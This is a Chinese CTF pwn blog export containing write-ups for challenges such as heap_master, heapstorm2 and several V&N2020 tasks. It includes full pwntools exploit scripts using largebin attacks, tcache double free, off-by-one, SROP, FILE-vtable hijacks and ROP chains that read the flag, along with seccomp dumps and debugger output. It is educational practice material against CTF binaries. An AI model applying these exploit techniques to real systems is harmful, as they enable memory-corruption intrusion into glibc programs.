name(2,"A"*0x200) #将1和0合并，calloc改成2 d(1) #0x421 d(2) #0x211 name(2,"A"*0x200) #into largebin rename(0,"A"*0x88 + p64(0x421) + p64(libc + 0x1e5090)*2 + p64(0) + p64(heap+0x10) ) #--&gt; chunk1 构造largebin attack 的堆块 d(0) d(2) #unlink 0x431 # gdb.attach(r) # pause() name(0,"./flag.txt\x00\x00" + "A"*0x1f0) #full the tcache size ,0x430 write './flag.txt' calloc之后将tcache的count填满 magic("ABCDE") #malloc -&gt; tcache read chunk_addr(list has 2 chunk,this is the first) add_rsp48 = libc + 0x000000000008cfd6 pop_rdi = libc + 0x0000000000026542 pop_rsi = libc + 0x0000000000026f9e pop_rdx = libc + 0x000000000012bda6 pop_rax = libc + 0x0000000000047cf8 syscall = libc + 0xcf6c5 magic( p64(add_rsp48)) #malloc -&gt; mnalloc_hook gdb.attach(r) name(0,p64(pop_rdi) + p64(heap + 0x24d0) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(0) + p64(syscall) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(1) + p64(syscall) ) r.interactive() calloc之后有一个地方会跳转到malloc_hook的地方 12► 0x7f05b5182a28 &lt;calloc+40&gt; mov rax, qword ptr [rip + 0x14a4c1] 0x7f05b5182a2f &lt;calloc+47&gt; mov rax, qword ptr [rax] 1RAX 0x7f05b52cdc30 (__malloc_hook) —▸ 0x7f05b5175fd6 (_IO_vtable_check+118) ◂— add rsp, 0x48 120x7f05b5182a32 &lt;calloc+50&gt; test rax, rax0x7f05b5182a35 &lt;calloc+53&gt; jne calloc+720 &lt;0x7f05b5182cd0&gt; 此时stack的内容是 12345678910111213141516171819202122232425262728293031323334353637pwndbg&gt; stack 5000:0000│ rsp 0x7ffc152a6c48 —▸ 0x7f1389569cda (calloc+730) ◂— test rax, rax01:0008│ r8-1 0x7ffc152a6c50 ◂— 0x002:0010│ 0x7ffc152a6c58 —▸ 0x7ffc152a70a0 —▸ 0x7ffc152a70c0 —▸ 0x560a78448f60 ◂— push r1503:0018│ 0x7ffc152a6c60 —▸ 0x560a78448150 ◂— xor ebp, ebp04:0020│ 0x7ffc152a6c68 —▸ 0x7ffc152a71a0 ◂— 0x105:0028│ 0x7ffc152a6c70 ◂— 0x006:0030│ 0x7ffc152a6c78 —▸ 0x560a784483a1 ◂— mov rcx, rax07:0038│ 0x7ffc152a6c80 ◂— 0x008:0040│ 0x7ffc152a6c88 ◂— 0xc80000000009:0048│ 0x7ffc152a6c90 —▸ 0x7f13894f6542 (init_cacheinfo+242) ◂— pop rdi0a:0050│ 0x7ffc152a6c98 —▸ 0x560a7a2674d0 ◂— './flag.txt' #这里开始就是rop0b:0058│ 0x7ffc152a6ca0 —▸ 0x7f13894f6f9e (strip+190) ◂— pop rsi0c:0060│ 0x7ffc152a6ca8 ◂— 0x00d:0068│ 0x7ffc152a6cb0 —▸ 0x7f1389517cf8 (mblen+104) ◂— pop rax0e:0070│ 0x7ffc152a6cb8 ◂— 0x20f:0078│ 0x7ffc152a6cc0 —▸ 0x7f138959f6c5 (__time_syscall+5) ◂— syscall 10:0080│ 0x7ffc152a6cc8 —▸ 0x7f13894f6542 (init_cacheinfo+242) ◂— pop rdi11:0088│ 0x7ffc152a6cd0 ◂— 0x312:0090│ 0x7ffc152a6cd8 —▸ 0x7f13894f6f9e (strip+190) ◂— pop rsi13:0098│ 0x7ffc152a6ce0 —▸ 0x560a7a265000 ◂— 0x014:00a0│ 0x7ffc152a6ce8 —▸ 0x7f13895fbda6 (__lll_lock_wait_private+38) ◂— pop rdx15:00a8│ 0x7ffc152a6cf0 ◂— 0x10016:00b0│ 0x7ffc152a6cf8 —▸ 0x7f1389517cf8 (mblen+104) ◂— pop rax17:00b8│ 0x7ffc152a6d00 ◂— 0x018:00c0│ 0x7ffc152a6d08 —▸ 0x7f138959f6c5 (__time_syscall+5) ◂— syscall 19:00c8│ 0x7ffc152a6d10 —▸ 0x7f13894f6542 (init_cacheinfo+242) ◂— pop rdi1a:00d0│ 0x7ffc152a6d18 ◂— 0x11b:00d8│ 0x7ffc152a6d20 —▸ 0x7f13894f6f9e (strip+190) ◂— pop rsi1c:00e0│ 0x7ffc152a6d28 —▸ 0x560a7a265000 ◂— 0x01d:00e8│ 0x7ffc152a6d30 —▸ 0x7f13895fbda6 (__lll_lock_wait_private+38) ◂— pop rdx1e:00f0│ 0x7ffc152a6d38 ◂— 0x1001f:00f8│ 0x7ffc152a6d40 —▸ 0x7f1389517cf8 (mblen+104) ◂— pop rax20:0100│ 0x7ffc152a6d48 ◂— 0x121:0108│ 0x7ffc152a6d50 —▸ 0x7f138959f6c5 (__time_syscall+5) ◂— syscall 22:0110│ 0x7ffc152a6d58 ◂— 0x0... ↓ 所以malloc就要用到rsp+0x48的位置然后就会执行rop链getshell]]></content>
      <tags>
        <tag>pwm知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUU刷题集]]></title>
    <url>%2F2020%2F08%2F02%2FBUU%E5%88%B7%E9%A2%98%E9%9B%86%2F</url>
    <content type="text"><![CDATA[之前一直有说要刷buu，但一直没怎么行动，今天开始，要好好刷题了!这篇blog将持续不定时更新（如果能日更就好了）啊宁！冲呀！ mrctf2020-spfa这题其实刚开始看到我就觉得是算法题（曾经被最短路径折磨得不清啊 仔细看代码，发现程序有一个判断，两节点之间的路径&gt;=两节点通过第三结点连接的路径的话就会给两节点附上两路径之和。 1234567891011121314if ( s[v7] &gt;= s[v6] + len[i] ) &#123; s[v7] = len[i] + s[v6]; if ( !v9[v7] ) &#123; v9[v7] = 1; qu[v4++] = v7; if ( v4 &gt; 1000 ) &#123; puts("queue overflow error!"); return __readfsqword(0x28u) ^ v10; &#125; &#125; &#125; 如果路径长度都为0，则可陷入循环，直至qu[1000]，而这个位置刚好是flag的位置，所以覆写-1为0，就可以绕过代码，直接getshell exp：1234567891011121314151617from pwn import *# p = process("./mrctf2020_spfa")p=remote('node3.buuoj.cn',26483) p.sendlineafter(":\n", '1')p.sendlineafter(":\n", '1' + " " + '2' + " " + '0')p.sendlineafter(":\n", '1')p.sendlineafter(":\n", '2' + " " + '1' + " " + '0')p.sendlineafter(":\n", '2')p.sendlineafter(":\n", '1' + " " + '2')p.sendlineafter(":\n", '3')p.interactive() pwnable_seethefileopen文件对文件的操作的pwn题我第一次见（一看就是刷题太少），感觉蛮有趣的，然后只好看大佬的wp，发现又是IO_FILE的利用，好像还是属于栈溢出 由于可以直接读文件，利用linux的proc伪文件系统读取/proc/self/maps即可获得libc基址（可能要两遍，主要是看.so的吧）然后要伪造IO_FILE劫持vtable，使调用fclose的时候调用伪造的结构体 关于fclose的调用过程：https://www.jianshu.com/p/0176ebe02354 在检查vtable_offset==0之后函数对fp-&gt;_flags的_IO_IS_FILEBUF位进行检查，_IO_IS_FILEBUF如上文定义如下 1#define _IO_IS_FILEBUF 0x2000 若该位不为0则调用_IO_un_link(fp)将fp指向的FILE结构体从_IO_list_all的单向链表中取下，并调用_IO_file_close_it(fp)关闭fp。然后将调用_IO_FINISH(fp)，相当于执行((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp) exp:123456789101112131415161718192021222324252627282930313233from pwn import *context(arch='i386',os='linux',log_level='debug')myelf = ELF("./seethefile")libc = ELF("./libc_32.so.6")io = remote("chall.pwnable.tw",10200)sla = lambda delim,data :io.sendlineafter(delim, data) openfile = lambda name : (sla("choice :","1"),sla("see :",name))readfile = lambda : (sla("choice :","2"))showfile = lambda : (sla("choice :","3"))leave = lambda name : (sla("choice :","5"),sla("ame :",name))# leak libcopenfile("/proc/self/maps")readfile()showfile()io.recvuntil("[heap]\n")libc_addr = int(io.recv(8),16)+0x1000system_addr = libc_addr +libc.symbols['system']# make fake filefakeFILE = 0x0804B284payload = 'a'*0x20payload += p32(fakeFILE)payload += p32(0xffffdfff)payload += ";$0"+'\x00'*0x8dpayload += p32(fakeFILE+0x98)payload += p32(system_addr)*3# getshellleave(payload)io.interactive() referencehttps://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/ 关于fclose的调用过程https://www.jianshu.com/p/0176ebe02354 [V&amp;N2020 公开赛]easyTHeap这个是个最简单的tcache+double freeglibc2.27增加了简单tcache这个机制就是先放进tcache的队列里，通过double free来使它进入unsorted bin队列来leak exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!usr/bin/env python# -*- coding:utf-8 -*- from pwn import* context.log_level ='DEBUG'p=process('./easyTHeap')# p = remote('node3.buuoj.cn',26148)elf = ELF('./easyTHeap')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def add(size): p.recvuntil("choice: ") p.sendline("1") p.recvuntil("size?") p.sendline(str(size))def edit(idx,content): p.recvuntil("choice: ") p.sendline("2") p.recvuntil("idx?") p.sendline(str(idx)) p.recvuntil("content:") p.send(content)def show(idx): p.recvuntil("choice: ") p.sendline("3") p.recvuntil("idx?") p.sendline(str(idx))def delete(idx): p.recvuntil("choice: ") p.sendline("4") p.recvuntil("idx?") p.sendline(str(idx))# add(0x80)add(0x100)add(0x68)delete(0)delete(0)show(0)heap_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 0x260print hex(heap_base)# gdb.attach(p)add(0x100)#2edit(2,p64(heap_base+0x10))add(0x100)#3add(0x100)#4 targetdelete(0)show(0)libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']__malloc_hook = libc_base + libc.sym['__malloc_hook']print hex(libc_base)print hex(__malloc_hook)realloc_hook=libc.sym['__realloc_hook']+libc_baserealloc = libc.symbols['realloc']+libc_basepayload = p64(0)+p64(0x2000000000000)+p64(0)*20+p64(0)# payload += p64(__malloc_hook)payload += p64(realloc_hook)edit(4,payload)add(0x100)one_gadget = libc_base + 0x10a38c# 0x4f2c5, 0x4f322, 0x10a38cpayload = p64(one_gadget)+p64(realloc+4) #rsp+0x70 == null(0x0)edit(5,payload)debug(0x0b6f)add(0x100)p.interactive() 新增知识点：通过这题是终于知道了onegadget那些个rsp+0x30=0或者null是什么了就是在调用malloc之后，call sytem那个位置，看stack里面，是否满足rsp + 0x30(或者其他）和onegadget里面的条件一致，一致的话这个gadget就可行，不然就要再调用realloc，增加偏移，使他满足（跟进realloc里面看，找到realloc + xxx 的位置为0，即可） [V&amp;N2020 公开赛]simpleheapoff by one的一道题 利用off by one可以改chunk size，构造overlap，free掉再add来leak libc，再free掉被重叠的一个堆块，然后再用另一个idx改fd为目标地址（即main_arena-0x23）再add两次就可以达到修改malloc为onegadget的目的了。 exp:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import*context.log_level = 'debug'context.arch = 'amd64'p = process('./vn_pwn_simpleHeap')elf = ELF('./vn_pwn_simpleHeap')libc = elf.libcdef add(size,content): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) p.sendafter('content:',content)def edit(index,content): p.sendlineafter('choice: ','2') p.sendlineafter('idx?',str(index)) p.sendafter('content:',content)def show(index): p.sendlineafter('choice: ','3') p.sendlineafter('idx?',str(index))def free(index): p.sendlineafter('choice: ','4') p.sendlineafter('idx?',str(index))add(0x28,'\n') #0add(0x68,'\n') #1add(0x68,'\n') #2add(0x20,'\n') #3payload = '\x00'*0x28 + '\xE1'edit(0,payload)free(1)gdb.attach(p)add(0x68,'\n') #1show(2)main_arena = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 88log.success('Main_Arena:\t' + hex(main_arena))libcbase = main_arena - (libc.symbols['__malloc_hook'] + 0x10)malloc_hook = libcbase + libc.symbols['__malloc_hook']log.success('Malloc_Hook:\t' + hex(malloc_hook))realloc = libcbase + 0x846CCone_gadget = libcbase + 0x4526Aadd(0x60,'\n') #4 -&gt;2free(3)free(2)payload = p64(malloc_hook-0x23)+'\n'edit(4,payload)add(0x60,'\n')add(0x60,'\x00'*(0x13-8) + p64(one_gadget)+p64(realloc)+'\n')p.sendlineafter('choice: ','1')p.sendlineafter('size?','32')p.interactive() [V&amp;N2020 公开赛]warmup这题开了沙箱，然后用seccomp-tools看一下什么被禁了 1234567891011121314151617coyote@ubuntu:~/Yee/V&amp;N$ seccomp-tools dump ./vn_pwn_warmupThis is a easy challange for you.Here is my gift: 0x7f41cd2fc690 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x07 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001 if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024 A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000 if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020 A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010 if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL 发现execve被禁了，所以我们只能用orw来把flag打印出来 题目的两次输入是连着的，第二次是在第一次的前面，所以我们把orw写到第一次输入里面，在第二次输入的跳转地址处填入pop rdi，由于第一次输入的内容会pop到rdi中，在第二次输入执行完之后会执行pop rdi操作，即执行输入一里的内容，第一步是read（0，stack，0x8)，需要接收一个参数，所以我们再次发送“flag”这个字符过去。 先用read把“flag”字符读进stack的位置里面（environ是libc存储的栈地址），open的时候拿它当参数，打开文件夹，再用read把flag的内容传到stack+8的地址里 123456pwndbg&gt; stack00:0000│ rsp 0x7fff6fee0268 —▸ 0x7fc045b630c9 (__lll_unlock_wake_private+25) ◂— pop rdx01:0008│ 0x7fff6fee0270 ◂— 0x10002:0010│ 0x7fff6fee0278 —▸ 0x7fc045e14f40 (namelen) ◂— 'flag&#123;1234567&#125;\n'03:0018│ 0x7fff6fee0280 —▸ 0x7fc045b452b0 (write) ◂— cmp dword ptr [rip + 0x2d2489], 004:0020│ 0x7fff6fee0288 ◂— 0x6161616161616161 ('aaaaaaaa') 最后用write打印出来即可 exp123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import*context.log_level = 'debug'p = process('./vn_pwn_warmup')elf = ELF('./vn_pwn_warmup')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')p.recvuntil("0x")puts_addr = int(p.recvline(),16)libc_base = puts_addr - libc.sym['puts']log.success("libc_base==&gt;" + hex(libc_base))libc.address = libc_basepop_rdi_ret = 0x0000000000021102+libc_basepop_rdx_rsi = 0x00000000001150c9+libc_baseret = 0x0000000000000937 + libc_basestack_addr = libc.sym['environ'] # environ是libc存储的栈地址#gdb.attach(p)payload = p64(0) + p64(pop_rdx_rsi) + p64(0x8) + p64(stack_addr) + p64(libc.sym['read']) #调用read函数，第一个参数写在了第二次输入的最后payload += p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(0)*2 + p64(libc.sym['open'])payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rdx_rsi) + p64(0x100) + p64(stack_addr+8) + p64(libc.symbols['read'])payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rdx_rsi) + p64(0x100) + p64(stack_addr+8) + p64(libc.symbols['write'])payload += "a"*(0x180-len(payload))gdb.attach(p)p.send(payload)sleep(0.1)payload = "a"*0x78 + p64(pop_rdi_ret)p.recvuntil("name?")p.send(payload)p.send("flag\x00")p.interactive() 新增知识点read（3,fstack+8,0x100),3是文件读入（0是键盘读入）ps:flag字符如果没有’\x00’截断是不可以过的 [V&amp;N2020 公开赛]babybabypwn也是开了沙箱的一题 12345678910111213141516171819coyote@ubuntu:~/Yee/V&amp;N$ seccomp-tools dump ./vn_pwn_babybabypwn_1 line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0d 0xc000003e if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff if (A != 0xffffffff) goto 0015 0005: 0x15 0x09 0x00 0x00000009 if (A == mmap) goto 0015 0006: 0x15 0x08 0x00 0x0000000a if (A == mprotect) goto 0015 0007: 0x15 0x07 0x00 0x00000029 if (A == socket) goto 0015 0008: 0x15 0x06 0x00 0x0000002a if (A == connect) goto 0015 0009: 0x15 0x05 0x00 0x00000031 if (A == bind) goto 0015 0010: 0x15 0x04 0x00 0x00000032 if (A == listen) goto 0015 0011: 0x15 0x03 0x00 0x00000038 if (A == clone) goto 0015 0012: 0x15 0x02 0x00 0x00000039 if (A == fork) goto 0015 0013: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0015 0014: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0015: 0x06 0x00 0x00 0x00000000 return KILL 题目： 12345678910111213unsigned __int64 sub_1347()&#123; char buf; // [rsp+0h] [rbp-110h] unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); puts("Welcome to v&amp;n challange!"); printf("Here is my gift: 0x%llx\n", &amp;puts); printf("Please input magic message: "); read(0, &amp;buf, 0x100uLL); syscall(15LL, &amp;buf); return __readfsqword(0x28u) ^ v2;&#125; 不过这题用了srop，一下子没想起来syscall 15是干嘛用的，后来经大佬提点才发现是srop。 exp1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import*context.log_level = 'debug'context.arch = 'amd64' p = process("./vn_pwn_babybabypwn_1")elf = ELF("./vn_pwn_babybabypwn_1")libc = ELF("./libc-2.23.so")stack_addr = libc.sym['environ']p.recvuntil("0x")puts_addr = int(p.recvline(),16)libc_base = puts_addr - libc.sym['puts']log.success("libc_base==&gt;" + hex(libc_base))libc.address = libc_basestack_addr = libc.sym['environ']pop_rdi_ret = 0x0000000000021102 + libc_basepop_rdx_rsi = 0x00000000001150c9 + libc_basepop_rdx_ret = 0x0000000000001b92 + libc_basesyscall_addr = 0x00000000000bc375 + libc_basesrop = SigreturnFrame() # pwntools提供了Sigreturn Frame的构建srop.rax = constants.SYS_readsrop.rdi = 0srop.rsi = stack_addrsrop.rdx = 0x200srop.rsp = stack_addr + 8srop.rip = syscall_addr#gdb.attach(p)payload = str(srop)[8:]p.send(payload)shell = "flag" + "\x00"*4 + p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(0) + p64(0) + p64(libc.symbols['open'])shell += p64(pop_rdi_ret) + p64(3) + p64(pop_rdx_rsi) + p64(0x100) + p64(stack_addr) + p64(libc.symbols['read'])shell += p64(pop_rdi_ret) + p64(1) + p64(pop_rdx_rsi) + p64(0x100) + p64(stack_addr) + p64(libc.symbols['write'])p.send(shell)p.interactive() ps：和前一道栈题其实很像 *CTF2019 heap_master这道我用unsorted bin + global max fast + free_hook通的（unsorted bin + IO_frush_all_lockp可能是用到栈上的地址，ret填了太多，所以一直是timeout 详细过程的话就看我另一篇blog吧 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#coding=utf8from sc_expwn import *# context.log_level = 'debug'context(arch='amd64', os='linux')context.terminal = ['tmux','splitw','-h']# p = process('./heap_master')p=remote('node3.buuoj.cn',27915)libc = ELF("./libc-2.23.so")# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def malloc(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size)) # else: # self.sendline('1') # self.sendline(str(size))def malloc_(size): p.sendline('1') p.sendline(str(size))def edit(offset,content): # if self.wait: p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(offset)) p.sendlineafter('size: ', str(len(content))) p.sendafter('content: ', content) # else: # self.sendline('2') # self.sendline(str(offset)) # self.sendline(str(len(content))) # self.send(content)def edit_(offset,content): p.sendline('2') p.sendline(str(offset)) p.sendline(str(len(content))) p.send(content)def free(offset): # if self.wait: p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(offset)) # else: # self.sendline('3') # self.sendline(str(offset))def free_(offset): p.sendline('3') p.sendline(str(offset)) libc_guess = 0x7ffff7a0d000offset_libc_free_hook= libc_guess +libc.symbols['__free_hook'] print hex(offset_libc_free_hook)offset_max_fast = offset_libc_free_hook +0x50# offset_max_fast=libc_guess+libc.symbols['global_max_fast']offset_libc_stdout=libc_guess+libc.symbols['_IO_2_1_stdout_']edit(0x8,p64(0x91)) #0edit(0x98, p64(0x21)) #1edit(0xb8, p64(0x21)) #2free(0x10) # gdb.attach(proc.pidof(p)[0])edit(0x18, p16((offset_max_fast-0x10)&amp;0xffff))malloc(0x80)#global_max_fast 赋值# gdb.attach(proc.pidof(p)[0])edit(0x8, p64(0xf1))edit(0xf8, p64(0x11)) free(0x10)edit(0x8, p64(0x91))# gdb.attach(p)edit(0x18, p16((offset_libc_stdout+0x10-0x10)&amp;0xffff)) #read_endmalloc(0x88)edit_(0x8, p64(0xf1))free_(0x10)edit_(0x8, p64(0x91))# gdb.attach(proc.pidof(p)[0])edit_(0x18, p16((offset_libc_stdout+0x20-0x10)&amp;0xffff)) #write_basemalloc_(0x88)heap_addr = u64(p.recv(8).ljust(8,'\x00'))-0x20print hex(heap_addr)fake = u64(p.recv(8).ljust(8,'\x00'))print hex(fake)addr_buf_base = u64(p.recv(8).ljust(8,'\x00'))print hex(addr_buf_base)libc_addr = u64(p.recv(8).ljust(8,'\x00'))-16 - libc.symbols['_IO_2_1_stdout_']print hex(libc_addr)p.recv(0x838)addr_stack= u64(p.recv(8).ljust(8,'\x00'))-0x3print hex(addr_stack)libc.address=libc_addraddr_libc_gets = libc.sep_function['gets']addr_libc_stdout = libc.symbols['_IO_2_1_stdout_']addr_libc_dl_open_hook = libc.symbols['_dl_open_hook']addr_libc_io_file_jumps = libc.symbols['_IO_file_jumps']addr_libc_io_str_jumps = addr_libc_io_file_jumps + 0xc0fastbin_ptr=libc.symbols['__free_hook']-0x1c88 +8free_hook=libc.sym["__free_hook"]system_addr=libc.sym["system"]size=0x3920fake_size=p64(size+1)edit(0x38,fake_size)edit(0x30+size,p64(0)+p64(0x21))free(0x40)edit(0x40,p64(system_addr))#修改fd为systemmalloc(0x3910)edit(0x110,'/bin/sh\x00')free(0x110)p.interactive() RCTF2019 babyheap我直接用house of strom做的，很多大佬也用了改global_max_fast来做，我过后再去看看 这里直接利用overlap来泄露，然后largebin attack改free_hook为setcontext+53的gadget，然后在对应位置放入rop链，free该堆块，即执行具体分析过程可以看我的另一篇blog exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146#coding=utf8from pwn import *context.log_level = "debug"# context.terminal = ["tmux","split","-h"]p = process("./babyheap")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")def add(size): p.recvuntil("Choice: ") p.sendline('1') p.recvuntil("Size: ") p.send(str(size))def edit(idx,data): p.recvuntil("Choice: ") p.sendline('2') p.recvuntil("Index: ") p.sendline(str(idx)) p.recvuntil("Content: ") p.send(data)def delete(idx): p.recvuntil("Choice: ") p.sendline('3') p.recvuntil("Index: ") p.sendline(str(idx))def show(idx): p.recvuntil("Choice: ") p.sendline('4') p.recvuntil("Index: ") p.sendline(str(idx))add(0x18) #0 0x21add(0x28) #1 0x31add(0xf8) #2add(0x18) #3add(0x18) #4add(0x508) #5add(0x18)add(0x18)add(0x508)add(0x18)# gdb.attach(p)delete(0) edit(1,'a'*0x20+p64(0x50))delete(2)add(0x18)show(1)libc_address=u64(p.recv(6).ljust(8,'\x00')) - 0x3c4b78print hex(libc_address)free_hook = libc.symbols["__free_hook"]+libc_addressfake_chunk = free_hook - 0x20# gdb.attach(p)add(0x68) #2add(0x48) #10add(0x100) #11 -&gt; old chunk2-&gt;smallbin 0xe0delete(2)add(0x100) #2 -&gt; chunk2 -&gt; smallbinshow(1)heap_base = u64(p.recvuntil("\n",drop=True).ljust(8,'\x00'))-0xe0print hex(heap_base)add(0x68)add(0x68)edit(5,'a'*0x4f0+p64(0x500))delete(5)edit(4,'a'*0x18)# gdb.attach(p)add(0x18)add(0x4d8) #14delete(5)delete(6)# --&gt;0x508add(0x30) add(0x4d0)# delete(8) #unsorted binedit(8,'a'*0x4f0+p64(0x500))delete(8)edit(7,'a'*0x18)add(0x18)#8add(0x4d8)#15delete(8)delete(9)# free -&gt;chunk5 but chunk8 hereadd(0x40)delete(6) #构造一个largebin 一个unsortedbinadd(0x4e8) #chunk5-&gt;largebin delete(6) #chunk2-&gt;unsortedbinpayload = p64(0)*3 + p64(0x4f1) + p64(0) + p64(fake_chunk) +p64(0)*2# bk fackchunk-&gt;fdedit(14,payload)payload2 = p64(0)*4 + p64(0) + p64(0x4e1) payload2 += p64(0) + p64(fake_chunk+8) #bk --&gt;fakechunk-&gt;bkpayload2 += p64(0) + p64(fake_chunk-0x18-5)#size 0x56edit(15,payload2)gdb.attach(p)add(0x40)# edit(8,p64(0)*3+p64(0x511))ret = libc_address+0x937p_rdi_r = libc_address+ 0x21112 #0x21102p_rsi_r = libc_address+ 0x202f8 #0x202e8p_rdx_r = libc_address+0x1b92rop_chain = "flag".ljust(8,"\x00")+p64(0)*12+p64(heap_base+0x1c0) #[rdi+0x68] is rdirop_chain += p64(0) #[rdi+0x70] is rsirop_chain += p64(0)*2 + p64(0) #[rdi+0x88] is rdxrop_chain = rop_chain.ljust(0xa0,"\x00")rop_chain += p64(heap_base+0x1c0+0x100)rop_chain += p64(libc.symbols["open"]+libc_address)rop_chain = rop_chain.ljust(0x100,"\x00")#now read and writerop_chain += p64(p_rdi_r)+p64(3)+p64(p_rsi_r)+p64(heap_base+0x1c0+0x200)rop_chain += p64(p_rdx_r)+p64(0x100)rop_chain += p64(libc.symbols["read"]+libc_address)rop_chain += p64(p_rdi_r)+p64(1)+p64(p_rsi_r)+p64(heap_base+0x1c0+0x200)rop_chain += p64(p_rdx_r)+p64(0x100)rop_chain += p64(libc.symbols["write"]+libc_address)edit(14,rop_chain)edit(6,"A"*0x10+p64(libc.symbols["setcontext"]+53+libc_address))delete(14)p.interactive() 0CTF 2018 heapstorm2off by one + house of storm 这题到后面绕过leak的条件那里有点复杂，不停地修改chunk的地址和size什么的，这个地方还是理了一段时间的最后再利用堆块地址改成free_hook，将free_hook的地址改成one_gadget就可以getshell了(最近都在刷house of storm的题了) exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122#coding=utf-8from pwn import *p = process('./heapstorm2')# p = remote('node3.buuoj.cn',29225)elf = ELF('./heapstorm2')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')if debug: gdb.attach(p)def malloc(size): p.recvuntil('Command: ') p.sendline('1') p.recvuntil('Size: ') p.sendline(str(size))def edit(index,content): p.recvuntil('Command: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(len(content))) p.recvuntil('Content: ') p.send(content)def delete(index): p.recvuntil('Command: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def show(index): p.recvuntil('Command: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index))def exp(): puts_got = elf.got['puts'] one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147] malloc(0x18) malloc(0x508) malloc(0x18) malloc(0x18) malloc(0x508) malloc(0x18) malloc(0x18) edit(1,'a'*0x4f0+p64(0x500)) edit(4,'a'*0x4f0+p64(0x500)) delete(1) edit(0,'a'*(0x18-0xc)) malloc(0x18) malloc(0x4d8) delete(1) delete(2) malloc(0x30) malloc(0x4e0) delete(4) edit(3,'a'*(0x18-0xc)) malloc(0x18) malloc(0x4d8) delete(4) delete(5) malloc(0x40) delete(2) malloc(0x4e8) delete(2) storage = 0x13370000 + 0x800 fake_chunk = storage - 0x20 payload = p64(0)*2 + p64(0) + p64(0x4f1) payload += p64(0) + p64(fake_chunk) edit(7,payload) payload2 = p64(0)*4 + p64(0) + p64(0x4e1)#size payload2 += p64(0) + p64(fake_chunk+8) payload2 += p64(0) + p64(fake_chunk-0x18-5) edit(8,payload2) gdb.attach(p) malloc(0x48) edit(2,p64(0)*5+p64(0x13377331)+p64(storage)) payload = p64(0)*3 + p64(0x13377331)+p64(storage) + p64(0x1000) + p64(storage-0x20+3)+p64(8) #chunk0 -chunk1 edit(0,payload) show(1) p.recvuntil('Chunk[1]: ') heap_base = u64(p.recvline().strip('\n')) - 0x60 print hex(heap_base) payload = p64(0)*3 + p64(0x13377331)+p64(storage) + p64(0x1000) + p64(heap_base+0x60+0x10) + p64(8) edit(0,payload) show(1) 